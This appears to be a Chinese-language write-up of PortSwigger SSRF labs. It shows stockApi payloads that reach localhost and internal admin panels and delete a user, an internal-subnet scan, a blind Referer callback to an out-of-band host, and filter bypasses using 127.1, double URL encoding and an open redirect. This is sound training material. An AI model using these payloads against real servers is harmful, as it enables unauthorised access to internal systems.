---
title: PortSwigger-Server-side request forgery (SSRF)
published: 2026-08-05 09:50
description: SSRF部分通关记录，非完整
tags:
  - 靶场
  - SSRF
category: 网络安全
draft: false
---

# Lab: Basic SSRF against the local server

后端在库存查询功能中，接收前端传入的 `stockApi` 参数，该参数用于指定要访问的库存 API 端点。后端服务器直接使用该参数发起 HTTP 请求，并**将响应内容返回给前端**，但**未对 `stockApi` 参数进行任何校验或白名单限制**。

攻击者可将 `stockApi` 参数修改为指向本地回环地址（`http://localhost/admin`），利用后端服务器作为跳板访问其本地的管理员接口。由于该管理员接口仅允许来自本地（loopback）的请求访问，而后端发起的请求恰好满足此条件，攻击者成功绕过身份验证限制，获取管理员功能界面。随后进一步将 `stockApi`指向删除用户的 API 路径（`/admin/delete?username=carlos`），通过后端服务器以管理员权限执行删除操作。

此漏洞属于典型的 **SSRF（服务器端请求伪造）**，攻击者利用后端服务器访问了本无法直接访问的内部管理接口。

**攻击向量**：`POST /product/stock` （`stockApi` 参数，位于请求体或 URL 参数中）  

**核心缺陷**：后端未对 `stockApi` 参数进行校验，导致可指向任意内部地址，利用本地回环地址绕过管理员身份验证。  

**利用条件**：

- 条件1：后端接受 `stockApi` 参数并直接发起 HTTP 请求。
    
- 条件2：后端将请求的响应内容返回给前端（回显型 SSRF）。
    
- 条件3：目标管理员接口仅允许来自 localhost（127.0.0.1）的请求访问。
    
- 条件4：后端服务器具备访问自身本地服务（localhost）的权限。

**请求格式**：`POST`，`application/x-www-form-urlencoded` 格式，`stockApi` 为表单字段。

抓取正常检查库存的请求，拦截 `/product/stock` 的 POST 请求，观察请求体中存在 `stockApi` 参数，指向外部库存服务：见①

将 `stockApi` 参数值 URL 解码后替换为 `http://localhost/admin`，重新编码后发送：见②

响应返回的内容中会包含管理员界面 HTML，其中列出所有用户及管理操作（如删除用户），进行删除操作，界面提示“Admin interface only available if logged in as an administrator, or if requested from loopback”，说明通过 localhost 访问已成功绕过。

从管理员界面中提取删除用户的 URL 路径（如 `/admin/delete?username=carlos`），再次修改 `stockApi` 参数指向该路径：见③

```
① stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

② stockApi=http://localhost/admin

③ stockApi=http://localhost/admin/delete?username=carlos
```

- 参数值需要进行 URL 编码（如 `:` 编码为 `%3A`，`/` 编码为 `%2F`），但 Burp 的 Repeater 会自动处理，直接输入明文即可。
    
- 若使用 `localhost` 被过滤，可尝试 `127.0.0.1` 或 `0.0.0.0`。
    
- 若响应中管理员界面不完整，检查返回的 HTML 中是否包含其他用户或操作路径。

**与同类漏洞的区别**：本实验属于**回显型（In-Band）基础 SSRF**，攻击者可直接通过 HTTP 响应查看内网服务（如 `/admin`）的返回内容，无需借助任何带外通道。相比后续更复杂的 SSRF 实验（如“SSRF with blacklist filter”或“Blind SSRF with out-of-band detection”），本实验的利用条件最为宽松——既无 URL 格式校验（允许任意协议和 IP），也无响应差异判断（报错或回显均可直接读取内容），因此攻击链路最短，仅需一次请求即可完成探测与利用。后续实验将引入各种限制（如只允许特定域名、必须匹配正则表达式、响应无回显等），届时需结合 URL 编码绕过、解析器差异或 OOB 外带等技术。

**测试方法**：

1. **抓包确认**：拦截 `/product/stock` 请求，确认存在 `stockApi` 参数，且其值会被后端发起 HTTP 请求。
    
2. **探测本地端口**：尝试将 `stockApi` 指向 `http://localhost:80`、`http://localhost:8080` 等常见端口，观察响应内容判断服务是否可达。
    
3. **访问管理员接口**：根据题目提示，将 `stockApi` 修改为 `http://localhost/admin`，检查响应中是否返回管理员界面 HTML。
    
4. **提取操作路径**：从管理员界面 HTML 中提取删除用户的 URL（如查看 `<a href="/admin/delete?username=...">`）。
    
5. **执行删除操作**：将 `stockApi` 改为完整的删除 URL，发送请求验证用户是否被删除。
    
6. **边界情况测试**：尝试 `http://127.0.0.1/admin`、`http://0.0.0.0/admin` 等不同回环地址表示方式；若 `localhost` 被拦截，尝试使用 `http://[::1]/admin`（IPv6 回环地址）。

# Lab: Basic SSRF against another back-end system

后端在库存查询功能中，接收前端传入的 `stockApi` 参数，并直接使用该参数发起 HTTP 请求，将响应内容返回给前端。后端**未对 `stockApi` 参数进行任何校验或白名单限制**，且允许访问内网 IP 地址（`192.168.0.X` 网段）。

攻击者将 `stockApi` 参数指向内网 IP 段 `192.168.0.1` 到 `192.168.0.255` 的 `8080` 端口，并通过暴力枚举的方式探测存活的 admin 接口。当发现 `192.168.0.111:8080/admin` 存在时，响应返回管理员界面。随后攻击者进一步将 `stockApi` 指向删除用户的 API 路径（`/admin/delete?username=carlos`），通过后端服务器以内网身份执行管理员操作，成功删除目标用户。

本实验属于**回显型 SSRF 结合内网资产扫描**，利用后端作为跳板访问内部网络中的其他后端系统，绕过防火墙对公网访问的限制。

**攻击向量**：`POST /product/stock` （`stockApi` 参数，位于请求体或 URL 参数中）  

**核心缺陷**：后端未对 `stockApi` 参数进行校验或过滤，允许访问内网 IP 地址，且响应内容回显至前端。  

**利用条件**：

- 条件1：后端接受 `stockApi` 参数并直接发起 HTTP 请求。
    
- 条件2：后端将请求的响应内容返回给前端（回显型 SSRF）。
    
- 条件3：内网中存在其他后端系统，且管理员接口监听在 `8080` 端口。
    
- 条件4：攻击者需要通过暴力枚举方式探测目标 IP。

**配置 Intruder**：

- 攻击类型：Sniper（狙击手）
    
- Payload 类型：Numbers（数字）
    
- 范围：1-255，步长 1

**请求格式**：`POST`，`application/x-www-form-urlencoded` 格式，`stockApi` 为表单字段。

```
stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

stockApi=http://192.168.0.$1$:8080/admin

stockApi=http://192.168.0.111:8080/admin/delete?username=carlos
```

**与同类漏洞的区别**：上一实验（Basic SSRF against the local server）仅针对**本地回环地址（localhost）**，用于绕过仅允许本地访问的管理员认证，攻击目标单一，无需扫描。而本实验将攻击范围扩展至**内网其他后端系统（192.168.0.X）**，需结合**暴力枚举（Intruder）** 进行内网资产探测，找到存活的管理接口后再进行利用。两者同属回显型 SSRF，但本实验的攻击链更长——从单一目标探测升级为内网段横向扫描，对攻击者的探测能力要求更高，也模拟了真实内网环境中“通过 SSRF 突破边界后横向移动”的典型场景。

**测试方法**：

1. **抓包确认**：拦截 `/product/stock` 请求，确认存在 `stockApi` 参数且其值会被后端发起 HTTP 请求。
    
2. **设置 Intruder 变量**：将 `stockApi` 中的 IP 地址最后一段设置为数字变量（如 `$1$`），类型为 Numbers，范围 1-255。
    
3. **配置攻击参数**：在 Intruder 的 Payloads 选项卡中设置数字范围 1-255，步长 1。
    
4. **发送爆破请求**：点击 "Start attack"，观察各请求的响应状态码和内容长度。
    
5. **筛选存活目标**：按响应内容长度排序，找出与其他请求差异明显的条目（如返回管理员界面 HTML）。
    
6. **提取操作路径**：从管理员界面 HTML 中提取删除用户的 URL（如查看 `<a href="/admin/delete?username=...">`）。
    
7. **执行删除操作**：将 `stockApi` 改为完整的删除 URL，发送请求验证用户是否被删除。
    
8. **边界情况测试**：若 `192.168.0.X` 范围被限制，尝试扫描其他内网段（如 `10.0.0.X`、`172.16.X.X`）；若 8080 端口被屏蔽，尝试扫描常见端口（如 80、443、8000、9000）。

# Lab: Blind SSRF with out-of-band detection

后端在商品详情页面功能中，接收到客户端请求后，会解析 HTTP 请求头中的 `Referer` 字段，并将其值用于后端业务逻辑（如记录访问来源、生成追溯链接等）。后端在处理 `Referer` 时，**直接使用该值发起 HTTP 请求或 DNS 查询**，但**未对 `Referer` 进行任何校验或过滤**，且**响应内容不返回给前端**（Blind 场景）。

攻击者将 `Referer` 字段的值修改为自己可控的 Burp Collaborator 域名。当后端服务器处理该请求时，会向 Collaborator 域名发起 DNS 查询或 HTTP 请求。攻击者通过监听 Collaborator 的交互日志，确认 SSRF 漏洞存在。

此漏洞属于典型的 **Blind SSRF（盲注型服务器端请求伪造）**，虽无法直接读取内网服务的响应内容，但可通过带外（OOB）通道探测漏洞是否存在。

**攻击向量**：`GET /product?productId=10` （`Referer` 请求头）  

**核心缺陷**：后端未对 `Referer` 头进行校验，直接将其值用于发起 DNS 查询或 HTTP 请求，且无响应回显。  

**利用条件**：

- 条件1：后端会解析并处理 `Referer` 头的值。
    
- 条件2：后端服务器可访问外网（能够发起 DNS 解析或 HTTP 请求）。
    
- 条件3：响应报文不包含任何后端请求的返回内容（纯盲打场景）。
    
- 条件4：攻击者拥有公网可访问的 Burp Collaborator 域名用于接收 DNS/HTTP 回调
	本实验触发点位于 `Referer` 头，但实际环境中 `User-Agent`、`Cookie`、`X-Forwarded-For` 等头部也可能被后端解析并用于发起请求。

**请求格式**：`GET`，`Referer` 为请求头字段。

```http
GET /product?productId=10 HTTP/2
Host: 0a1900a8039ba4f98081211f003d0089.web-security-academy.net
Cookie: session=HoYG1A2OOYFiBODRfbJyCeiXxM75GgV1
………………
Referer: http://etb4wjbrc9ctpzpbpaq1g85hs8yzmpae.oastify.com/
```

**与同类漏洞的区别**：前两个 SSRF 实验（Basic SSRF against the local server 和 against another back-end system）均属于**回显型（In-Band）SSRF**，攻击者可直接通过 HTTP 响应查看内网服务的返回内容（如管理员界面 HTML），利用结果立即可见。而本实验属于 **Blind SSRF**，后端不返回任何请求结果，攻击者无法直接读取内网服务的响应，必须通过**带外（OOB）通道**（如 Collaborator）检测 DNS 或 HTTP 交互来间接证明漏洞存在。两者对比：

- **回显型 SSRF**（前两关）：攻击者修改 `stockApi` 参数，响应中直接包含内网服务返回的 HTML 或数据，适合读取敏感信息（如 admin 界面、配置文件）。
    
- **盲注型 SSRF**（本实验）：攻击者修改 `Referer` 头，响应中无任何内网服务的信息，仅能通过 Collaborator 日志确认“后端确实发起了请求”，适合漏洞探测或绕过无回显限制的场景。
    
- **核心差异**：本实验不依赖响应内容，但需要额外的 OOB 基础设施（Collaborator），且无法直接窃取数据，仅能验证漏洞存在。

**测试方法**：

1. **获取 Collaborator 域名**：在 Burp Collaborator 客户端生成唯一子域名。
    
2. **抓包确认**：拦截 `/product` 请求，观察是否存在可能被后端解析的请求头（如 `Referer`、`Host`、`Origin`）。
    
3. **替换 Referer 头**：将 `Referer` 的值替换为 Collaborator 域名，发送请求。
    
4. **轮询 Collaborator**：等待 5-10 秒后，在 Collaborator 客户端点击 "Poll now"，检查是否存在来自目标服务器 IP 的 DNS 查询或 HTTP 请求。
    
5. **扩展测试**：若 `Referer` 无响应，尝试修改其他头部（如 `User-Agent`、`X-Forwarded-For`、`X-Original-URL`），观察是否有交互。
    
6. **边界情况测试**：若 `http://` 协议被限制，尝试 `https://` 或不带协议的域名（如 `//collaborator.com`），观察 DNS 查询是否依然触发。

# Lab: SSRF with blacklist-based input filter

后端在库存查询功能中，接收前端传入的 `stockApi` 参数，并直接使用该参数发起 HTTP 请求，将响应内容返回给前端。但后端对 `stockApi` 参数实施了**黑名单过滤**，禁止使用 `localhost`、`127.0.0.1`、`0.0.0.0`、`[::1]` 等指向回环地址的字符串，同时也禁止 URL 路径中出现 `admin` 字符串，以防止攻击者访问本地管理接口。

然而，该黑名单过滤存在两处缺陷：

1. **IP 地址格式校验不严谨**：仅匹配了完整的 `127.0.0.1` 等标准格式，未考虑到 IP 地址的简写形式（如 `127.1` 等价于 `127.0.0.1`），导致黑名单被绕过。
    
2. **URL 解码校验顺序缺陷**：后端先对 URL 进行解码，再进行黑名单匹配，且仅匹配解码后的内容，未对编码后的字符串进行检测。攻击者对 `admin` 进行**两次 URL 编码**（如 `admin` → `%61%64%6D%69%6E` → `%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`），使得解码前不包含 `admin` 字符串，从而绕过黑名单，解码后解析器仍能正确识别路径为 `/admin`。

此漏洞属于**黑名单过滤不完善 + URL 编码绕过**的典型组合，攻击者利用 IP 简写形式和双重编码突破访问控制。

**攻击向量**：`POST /product/stock` （`stockApi` 参数，位于请求体或 URL 参数中）  

**核心缺陷**：黑名单仅匹配标准回环地址格式和明文字符串，未处理 IP 简写形式（`127.1`）和多重 URL 编码（`%25%36%31...`）。  

**利用条件**：

- 条件1：后端接受 `stockApi` 参数并直接发起 HTTP 请求。
    
- 条件2：后端将请求的响应内容返回给前端（回显型 SSRF）。
    
- 条件3：黑名单过滤了 `localhost`、`127.0.0.1`、`admin` 等关键字。
    
- 条件4：后端对 `stockApi` 进行 URL 解码后再匹配黑名单，但仅解码一次。

**请求格式**：`POST`，`application/x-www-form-urlencoded` 格式，`stockApi` 为表单字段。

```
stockApi=http://127.1/admin

stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65

stockApi=http://127.1/admin/delete?username=carlos

stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%66%25%36%34%25%36%35%25%36%63%25%36%35%25%37%34%25%36%35%25%33%66%25%37%35%25%37%33%25%36%35%25%37%32%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%36%33%25%36%31%25%37%32%25%36%63%25%36%66%25%37%33
```

**与同类漏洞的区别**：前两个 SSRF 实验（Basic SSRF）均**无任何输入过滤**，直接使用 `localhost` 或内网 IP 即可访问管理接口。而本实验引入了**黑名单过滤机制**，对回环地址关键字（`localhost`、`127.0.0.1`）和管理路径关键字（`admin`）进行拦截，属于**带过滤器的 SSRF**。攻击者需结合**IP 格式变体**（如 `127.1`）和**URL 双重编码**两种绕过技术，突破黑名单限制。此实验展示了黑名单防御的典型弱点：无法穷举所有 IP 地址表示形式（十进制、八进制、十六进制、简写等），也无法有效防御多重编码攻击。后续更复杂的 SSRF 实验（如白名单过滤）将需结合 URL 解析器差异或开放重定向等更高级的绕过手法。

**测试方法**：

1. **抓包确认**：拦截 `/product/stock` 请求，确认存在 `stockApi` 参数。
    
2. **测试 IP 黑名单绕过**：依次尝试 `127.0.0.1`、`localhost`、`0.0.0.0`、`[::1]`，确认被拦截后改用 `127.1`、`127.0.1`、`2130706433`（十进制）等变体。
    
3. **测试路径关键字黑名单**：访问 `http://127.1/admin` 确认被拦截，观察错误信息。
    
4. **生成双重编码 Payload**：使用 Burp Decoder 对 `admin` 进行两次 URL 编码，替换 `stockApi` 发送，观察是否返回管理员界面。
    
5. **提取删除路径**：从管理员界面 HTML 中提取删除用户的 URL（如 `/admin/delete?username=carlos`）。
    
6. **双重编码完整路径**：对完整路径进行两次 URL 编码，发送请求验证用户是否被删除。
    
7. **边界情况测试**：尝试其他 IP 简写形式（如 `127.0.1` 等价 `127.0.0.1`）、八进制（`0177.0.0.1`）、十六进制（`0x7F000001`）、十进制整数（`2130706433`）；尝试对 `admin` 进行单次编码确认被拦截（验证需要两次编码）。

### 补充解释（为什么 127.1 能绕过 & 双重 URL 编码的工作原理）

**1. 为什么 127.1 等价于 127.0.0.1？**

- 在 IP 地址表示中，允许省略全零的段。`127.1` 在解析时会被自动扩展为 `127.0.0.1`。
    
- 类似地，`127.0.1` 等价于 `127.0.0.1`，`10.1` 等价于 `10.0.0.1`。
    
- 许多黑名单仅匹配 `127.0.0.1` 和 `localhost` 的完整字符串，无法覆盖所有合法的 IP 变体表示法。

**2. 双重 URL 编码为什么能绕过？**

- 后端在处理 `stockApi` 参数时，通常会进行一次 URL 解码（将 `%61` 还原为 `a`），然后用解码后的字符串匹配黑名单。
    
- 如果仅编码一次：`admin` → `%61%64%6D%69%6E` → 解码后得到 `admin` → 命中黑名单，被拦截。
    
- 如果编码两次：`admin` → `%61%64%6D%69%6E` → `%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`
    
    - 后端第一次解码：`%25%36%31...` → `%61%64%6D%69%6E`（此时字符串中不包含明文 `admin`）
        
    - 黑名单匹配 `admin` → 未命中 → 放行
        
    - 解析器在处理 URL 时进行第二次解码：`%61%64%6D%69%6E` → `admin`
        
    - 最终访问路径为 `/admin`，成功绕过黑名单。

**3. 两次 URL 编码后的字符串对照表**

|   明文字符串    |            一次编码            |                                    两次编码                                    |
| :--------: | :------------------------: | :------------------------------------------------------------------------: |
|  `admin`   |     `%61%64%6D%69%6E`      |              `%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`               |
|    `/`     |           `%2F`            |                                `%25%32%66`                                 |
|    `?`     |           `%3F`            |                                `%25%33%66`                                 |
|    `=`     |           `%3D`            |                                `%25%33%64`                                 |
|  `delete`  |    `%64%65%6C%65%74%65`    |          `%25%36%34%25%36%35%25%36%63%25%36%35%25%37%34%25%36%35`          |
| `username` | `%75%73%65%72%6E%61%6D%65` | `%25%37%35%25%37%33%25%36%35%25%37%32%25%36%65%25%36%31%25%36%64%25%36%35` |
|  `carlos`  |    `%63%61%72%6C%6F%73`    |          `%25%36%33%25%36%31%25%37%32%25%36%63%25%36%66%25%37%33`          |

**4. 为什么不能只对 `admin` 编码，而需要对完整路径编码？**

- 黑名单可能仅匹配路径中的 `admin`，但如果只编码 `admin`，URL 中仍可能出现明文 `/` 或 `?`，不影响绕过。
    
- 在本实验中，黑名单仅拦截路径中的 `admin` 关键字，因此只需对 `admin` 进行双重编码即可访问管理员界面。但对于删除操作，路径中包含 `admin` 和 `delete`、`username`、`carlos` 等多个关键词，为了保险起见，对**整个路径**进行双重编码可避免任何意外的字符串匹配拦截。
    
- 如果后端黑名单还包含 `delete` 或 `username` 等关键字，则完整路径编码是必要的。

# Lab: SSRF with filter bypass via open redirection vulnerability

后端在库存查询功能中，接收 `stockApi` 参数，但该参数被**白名单限制为仅允许相对路径**（必须以 `/` 开头），后端将相对路径拼接到本地应用的基 URL（如 `http://localhost/`）后发起请求，并返回响应内容。然而，本地应用存在一个**开放重定向（Open Redirect）** 接口 `/product/nextProduct`，该接口接受 `path` 参数并返回 302 跳转到该参数指定的 URL。

攻击者通过将 `stockApi` 指向该重定向接口，并在 `path` 参数中指定内网地址（如 `http://192.168.0.12:8080/admin`），让后端服务器请求 `http://localhost/product/nextProduct?path=http://内网IP/admin`，获得 302 响应后**自动跟随跳转**，最终访问内网管理员界面，实现 SSRF 绕过白名单限制。

本实验属于 **SSRF + 开放重定向组合利用**，通过本地应用的合法跳转功能间接访问受限的内网资源。

**攻击向量**：`POST /product/stock`（`stockApi` 参数，值为相对路径）  

**核心缺陷**：`stockApi` 仅允许相对路径，但本地存在开放重定向，后端会跟随重定向，导致可间接访问任意内网地址。 

**利用条件**：

- 条件1：`stockApi` 必须为相对路径（以 `/` 开头），后端拼接到 `http://localhost`。
    
- 条件2：本地应用存在开放重定向接口（如 `/product/nextProduct?path=xxx`）。
    
- 条件3：后端 HTTP 客户端会自动跟随 302 重定向。
    
- 条件4：内网中存在管理员接口（监听 8080 端口），但具体 IP 需扫描确定。

**请求格式**：`POST`，`application/x-www-form-urlencoded` 格式，`stockApi` 为表单字段。

**查看库存接口数据包**

```
原数据：
stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

解码之后：
stockApi=/product/stock/check?productId=2&storeId=1
```

**寻找开放重定向接口**

通过浏览应用或抓包发现 `/product/nextProduct` 接口存在开放重定向，示例请求：

```http
GET /product/nextProduct?currentProductId=4&path=/product?productId=5
```

```http
Next Product原数据包：
GET /product/nextProduct?currentProductId=4&path=/product?productId=5 HTTP/2
Host: 0a5400fe04f1c9de8084e9c800ac0011.web-security-academy.net
Cookie: session=bL0Pf2MO92RTik9LL4bY4fbk6yaCELhG; session=c5WQWMmGnVz0ZFWYBcsyDHpFW1MtdCqs

检查库存原数据包：
POST /product/stock HTTP/2
Host: 0a9200c904e007948050856a00790088.web-security-academy.net
Cookie: session=7pCvKzKyL58FVQ0DLhYKgSw8vb6S847o; session=L4Y0ZQQGxWJqbzXaWLjisopdBPaFquCP
………………
```

**在库存接口`stockApi`中利用该接口**

```http
POST /product/stock HTTP/2
Host: 0a9200c904e007948050856a00790088.web-security-academy.net
Cookie: session=7pCvKzKyL58FVQ0DLhYKgSw8vb6S847o; session=L4Y0ZQQGxWJqbzXaWLjisopdBPaFquCP
………………
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

**与同类漏洞的区别**：前序实验（Basic SSRF、黑名单/白名单绕过）均通过直接修改 `stockApi` 中的主机名或利用 IP 变体来绕过过滤器，而本实验引入了**开放重定向**作为中间跳板。当直接访问内网 IP 被白名单拦截（仅允许相对路径）时，攻击者无法直接输入 `http://`，只能利用本地应用自身的重定向功能间接访问。这种组合利用手法在真实场景中更为隐蔽，因为重定向接口通常是业务功能的一部分，不易被开发者视为安全风险。

**测试方法**：

1. **抓包确认**：拦截 `/product/stock` 请求，确认 `stockApi` 为相对路径且白名单仅允许 `/` 开头。
    
2. **发现重定向接口**：浏览应用，寻找带 `url`/`path`/`redirect` 参数的跳转链接，或通过抓包发现 `/product/nextProduct`。
    
3. **验证重定向有效性**：通过浏览器访问重定向接口并指向 `http://example.com`，观察是否跳转。
    
4. **构造 `stockApi`**：将相对路径指向重定向接口，`path` 参数指向目标内网地址，发送请求。
    
5. **内网扫描**：若目标 IP 不通，使用 Intruder 扫描 C 段（如 `192.168.0.1-255`）的 8080 端口，匹配响应内容。
    
6. **执行删除**：从管理员界面提取删除路径，构造完整 Payload 发送。
    
7. **边界情况测试**：若 `path` 参数要求相对路径，尝试 `//内网IP/`（省略协议）或对 URL 进行二次编码绕过。

### 补充解释：当内网服务全部返回302时的扫描技巧

**场景描述**：在利用开放重定向进行内网扫描时（如通过 `stockApi=/product/nextProduct?path=http://192.168.0.$1$:8080/admin/delete?username=carlos`），发现**扫描结果中所有IP都返回302状态码**，无法通过200/404等状态码直接区分服务是否存在。

**原因分析**：  

内网服务可能统一返回302重定向（例如要求先登录、或重定向到首页），这是目标业务本身的正常行为，不代表服务不存在。因此，判断依据不应是状态码（因为所有都存在都返回302），而是**响应是否包含有效的HTTP响应内容**。

**如何区分存在与不存在**：

|     对比维度      |       服务存在（返回302）       | 服务不存在（连接失败）  |
| :-----------: | :---------------------: | :----------: |
|    **状态码**    |     302（有效HTTP状态码）      | 无状态码，连接超时/拒绝 |
| **Location头** | 有（如 `Location: /login`） |      无       |
|    **响应体**    | 有内容（如 "Redirecting..."） |    空或错误信息    |
|   **响应长度**    |        固定几十到几百字节        |     0或极短     |
|   **响应时间**    |         快速（<1秒）         |  可能超时（数秒以上）  |

**推荐扫描配置（Burp Intruder）**：

1. **Grep - Match 匹配 Location 头**：在Options中添加正则匹配 `Location: /` 或 `Location: http`，将包含重定向头的响应高亮标记。
    
2. **筛选有效状态码**：过滤掉状态码为 `0` 或连接超时的条目，保留状态码为302的请求。
    
3. **响应长度排序**：成功返回302的响应长度通常一致，按Length排序后可快速发现异常（如长度明显不同或为0的条目）。
    

**手动验证流程**：

1. 从扫描结果中任选一个返回302的IP（如 `192.168.0.12`）。
    
2. 在Repeater中发送删除请求：
    `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
    
3. 观察响应：
    
    - 若返回302，查看 `Location` 头（如跳转到 `/admin`），说明服务存在。
        
    - 再次访问 `/admin` 界面（用同样方式），确认 `carlos` 是否已被删除。
    
4. 如果用户已消失，说明删除成功，即使响应是302。

**常见误区**：

- 错误做法：认为返回302就是"不存在"，放弃该IP。
    
- 正确做法：只要响应包含 `Location` 头，就说明服务可达，应视为候选目标继续测试。

**如果所有IP都无Location头或全部超时**：

- 检查端口是否正确（本题为8080）。
    
- 检查网段范围（是否应为 `192.168.1.X` 或其他）。
    
- 检查重定向接口参数名是否正确（本实验为 `path`）。